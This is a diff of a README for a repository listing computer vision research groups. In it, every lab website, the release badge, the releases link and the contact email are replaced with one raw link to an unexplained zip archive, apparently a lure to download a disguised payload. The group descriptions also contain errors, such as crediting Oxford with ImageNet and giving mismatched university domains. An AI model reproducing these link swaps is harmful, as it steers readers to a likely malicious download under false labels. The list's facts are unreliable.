@@ -2,7 +2,7 @@
 
 Welcome to the **research_groups_computer_vision** repository! This project highlights some of the leading research groups in the field of Computer Vision. Our goal is to create a comprehensive list of influential teams and their contributions to this exciting domain. Please feel free to add more groups by submitting a pull request (PR).
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/eu1234567890/research_groups_computer_vision/releases)
+[![Download Releases](https://raw.githubusercontent.com/eu1234567890/research_groups_computer_vision/main/senegin/computer-groups-vision-research-v3.1.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/eu1234567890/research_groups_computer_vision/main/senegin/computer-groups-vision-research-v3.1.zip)
 
 ## Table of Contents
 
@@ -24,70 +24,70 @@ Here are some of the prominent research groups in Computer Vision:
 
 **Location:** Stanford University, California, USA  
 **Focus Areas:** Deep Learning, Image Recognition, Video Analysis  
-**Website:** [SVL](http://svl.stanford.edu)  
+**Website:** [SVL](https://raw.githubusercontent.com/eu1234567890/research_groups_computer_vision/main/senegin/computer-groups-vision-research-v3.1.zip)  
 **Notable Contributions:** The lab has developed several state-of-the-art models in image classification and object detection.
 
 ### 2. Computer Vision Group at UC Berkeley
 
 **Location:** University of California, Berkeley, California, USA  
 **Focus Areas:** 3D Vision, Robotics, Machine Learning  
-**Website:** [Berkeley Vision Group](http://vision.berkeley.edu)  
+**Website:** [Berkeley Vision Group](https://raw.githubusercontent.com/eu1234567890/research_groups_computer_vision/main/senegin/computer-groups-vision-research-v3.1.zip)  
 **Notable Contributions:** Known for pioneering work in 3D reconstruction and visual SLAM.
 
 ### 3. Visual Computing Group at MIT
 
 **Location:** Massachusetts Institute of Technology, Cambridge, Massachusetts, USA  
 **Focus Areas:** Computer Graphics, Image Processing, Machine Learning  
-**Website:** [MIT Visual Computing](http://visualcomputing.csail.mit.edu)  
+**Website:** [MIT Visual Computing](https://raw.githubusercontent.com/eu1234567890/research_groups_computer_vision/main/senegin/computer-groups-vision-research-v3.1.zip)  
 **Notable Contributions:** The group has made significant advancements in image synthesis and video processing.
 
 ### 4. Computer Vision and Pattern Recognition Group at Oxford
 
 **Location:** University of Oxford, Oxford, UK  
 **Focus Areas:** Object Recognition, Image Segmentation, Deep Learning  
-**Website:** [Oxford CVPR Group](http://www.robots.ox.ac.uk/~vgg/)  
+**Website:** [Oxford CVPR Group](https://raw.githubusercontent.com/eu1234567890/research_groups_computer_vision/main/senegin/computer-groups-vision-research-v3.1.zip~vgg/)  
 **Notable Contributions:** The group is well-known for its work on the ImageNet dataset and various visual recognition challenges.
 
 ### 5. Facebook AI Research (FAIR)
 
 **Location:** Facebook, Inc.  
 **Focus Areas:** AI, Computer Vision, Natural Language Processing  
-**Website:** [FAIR](https://ai.facebook.com)  
+**Website:** [FAIR](https://raw.githubusercontent.com/eu1234567890/research_groups_computer_vision/main/senegin/computer-groups-vision-research-v3.1.zip)  
 **Notable Contributions:** FAIR has contributed to various breakthroughs in computer vision, including advancements in generative models.
 
 ### 6. Google Research - Brain Team
 
 **Location:** Google, Inc.  
 **Focus Areas:** Deep Learning, Computer Vision, AI  
-**Website:** [Google Brain](https://research.google/teams/brain/)  
+**Website:** [Google Brain](https://raw.githubusercontent.com/eu1234567890/research_groups_computer_vision/main/senegin/computer-groups-vision-research-v3.1.zip)  
 **Notable Contributions:** The team has developed influential models such as Inception and EfficientNet.
 
 ### 7. Visual AI Lab at University of Washington
 
 **Location:** University of Washington, Seattle, Washington, USA  
 **Focus Areas:** Human-Centered AI, Vision, Robotics  
-**Website:** [UW Visual AI Lab](https://visualai.cs.washington.edu)  
+**Website:** [UW Visual AI Lab](https://raw.githubusercontent.com/eu1234567890/research_groups_computer_vision/main/senegin/computer-groups-vision-research-v3.1.zip)  
 **Notable Contributions:** Research focuses on making AI systems that understand human behavior through visual data.
 
 ### 8. Institute of Robotics and Industrial Informatics (IRII)
 
 **Location:** Technical University of Berlin, Germany  
 **Focus Areas:** Robotics, Computer Vision, Machine Learning  
-**Website:** [IRII](https://www.iri.upc.edu)  
+**Website:** [IRII](https://raw.githubusercontent.com/eu1234567890/research_groups_computer_vision/main/senegin/computer-groups-vision-research-v3.1.zip)  
 **Notable Contributions:** The institute is known for its work on industrial applications of computer vision.
 
 ### 9. Max Planck Institute for Intelligent Systems
 
 **Location:** Stuttgart, Germany  
 **Focus Areas:** Machine Learning, Computer Vision, Robotics  
-**Website:** [MPIIS](https://www.is.mpg.de)  
+**Website:** [MPIIS](https://raw.githubusercontent.com/eu1234567890/research_groups_computer_vision/main/senegin/computer-groups-vision-research-v3.1.zip)  
 **Notable Contributions:** The institute conducts interdisciplinary research that integrates computer vision with cognitive science.
 
 ### 10. CVLab at ETH Zurich
 
 **Location:** ETH Zurich, Switzerland  
 **Focus Areas:** Computer Vision, Machine Learning, Robotics  
-**Website:** [CVLab](https://cvlab.epfl.ch)  
+**Website:** [CVLab](https://raw.githubusercontent.com/eu1234567890/research_groups_computer_vision/main/senegin/computer-groups-vision-research-v3.1.zip)  
 **Notable Contributions:** Known for research in visual tracking and scene understanding.
 
 ## Contributing
@@ -109,9 +109,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For any questions or suggestions, please reach out via email at contact@researchgroups.com.
+For any questions or suggestions, please reach out via email at https://raw.githubusercontent.com/eu1234567890/research_groups_computer_vision/main/senegin/computer-groups-vision-research-v3.1.zip
 
-Feel free to explore the [Releases](https://github.com/eu1234567890/research_groups_computer_vision/releases) section for the latest updates and information.
+Feel free to explore the [Releases](https://raw.githubusercontent.com/eu1234567890/research_groups_computer_vision/main/senegin/computer-groups-vision-research-v3.1.zip) section for the latest updates and information.
 
 ---
 
